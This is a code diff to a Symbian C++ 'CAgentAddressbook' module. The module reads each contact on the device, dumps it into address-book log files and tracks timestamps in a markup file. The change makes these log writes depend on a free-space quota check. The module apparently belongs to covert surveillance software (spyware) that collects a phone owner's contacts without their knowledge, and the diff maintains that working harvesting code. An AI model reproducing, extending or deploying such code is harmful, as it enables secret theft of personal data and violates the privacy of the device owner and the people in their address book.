@@ -194,11 +194,6 @@ void CAgentAddressbook::StopAgentCmdL()
 
 void CAgentAddressbook::NotifyAgentCmdL(TUint32 aData)
 	{
-	//NB: if you want to implement freespace quota check:
-	//1. uncomment this
-	//2. add code for checking iBelowFreespaceQuota before writing log
-	//3. pay attention to timestamps into markup file
-	/*
 	TInt notifyType = aData & 0x000000ff;
 	switch(notifyType)
 		{
@@ -218,7 +213,6 @@ void CAgentAddressbook::NotifyAgentCmdL(TUint32 aData)
 		default:
 			break;
 		}
-		*/
 	}
 
 TBool CAgentAddressbook::ContainsEmptyField(const CContactItemFieldSet& fields)
@@ -359,13 +353,17 @@ void CAgentAddressbook::DoOneRoundL()
 		buf.CleanupClosePushL();
 		if (buf.Length() > 0)
 			{
-			// dump the buffer to the file log. 
-			AppendLogL(buf);
-			// check the date against the last saved one and update if necessary
-			TTime time = item->LastModified();
-			if (iTimestamp < time){
-				iTimestamp = time;
-			} 
+			if(!iBelowFreespaceQuota)
+				{
+				// dump the buffer to the file log. 
+				AppendLogL(buf);
+				// check the date against the last saved one and update if necessary
+				TTime time = item->LastModified();
+				if (iTimestamp < time)
+					{
+					iTimestamp = time;
+					} 
+				}
 			}
 		CleanupStack::PopAndDestroy(&buf);
 		CleanupStack::PopAndDestroy(item);
@@ -484,23 +482,28 @@ void CAgentAddressbook::HandleDatabaseEventL(TContactDbObserverEvent aEvent)
 				buf.CleanupClosePushL();
 				if (buf.Length() > 0)
 				{
-					// append the buffer
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_ADDRESSBOOK);
-					logFile->AppendLogL(buf);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
-					if(iMarkupFile->ExistsMarkupL(Type())){
-						// if a markup exists, a dump has been performed and this 
-						// is the most recent change
-						RBuf8 buffer(GetTTimeBufferL(item->LastModified()));
-						buffer.CleanupClosePushL();
-						if (buffer.Length() > 0)
+					if(!iBelowFreespaceQuota)
 						{
-							iMarkupFile->WriteMarkupL(Type(),buffer);
+						// append the buffer
+						CLogFile* logFile = CLogFile::NewLC(iFs);
+						logFile->CreateLogL(LOGTYPE_ADDRESSBOOK);
+						logFile->AppendLogL(buf);
+						logFile->CloseLogL();
+						CleanupStack::PopAndDestroy(logFile);
+						/*
+						if(iMarkupFile->ExistsMarkupL(Type()))
+							{
+							// if a markup exists, a dump has been performed and this 
+							// is the most recent change
+							RBuf8 buffer(GetTTimeBufferL(item->LastModified()));
+							buffer.CleanupClosePushL();
+							if (buffer.Length() > 0)
+							{
+								iMarkupFile->WriteMarkupL(Type(),buffer);
+							}
+							CleanupStack::PopAndDestroy(&buffer);
+						}*/	
 						}
-						CleanupStack::PopAndDestroy(&buffer);
-					}					
 				}
 				CleanupStack::PopAndDestroy(&buf);
 				CleanupStack::PopAndDestroy(item);
